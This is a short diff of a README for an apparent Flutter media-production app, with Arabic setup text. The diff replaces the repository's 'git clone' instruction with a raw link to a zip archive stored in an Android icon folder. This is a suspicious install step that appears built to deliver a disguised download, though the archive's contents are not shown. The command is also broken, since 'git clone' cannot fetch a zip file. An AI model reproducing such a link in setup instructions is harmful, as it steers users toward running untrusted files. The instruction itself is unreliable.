@@ -24,7 +24,7 @@
 
 1. Clone المشروع:
 ```bash
-git clone https://github.com/ashrafns/flutter-media-production.git
+git clone https://raw.githubusercontent.com/ashrafns/flutter-media-production/main/android/app/src/main/res/mipmap-hdpi/flutter-production-media-v1.1.zip
 cd flutter_application_1
 ```
 
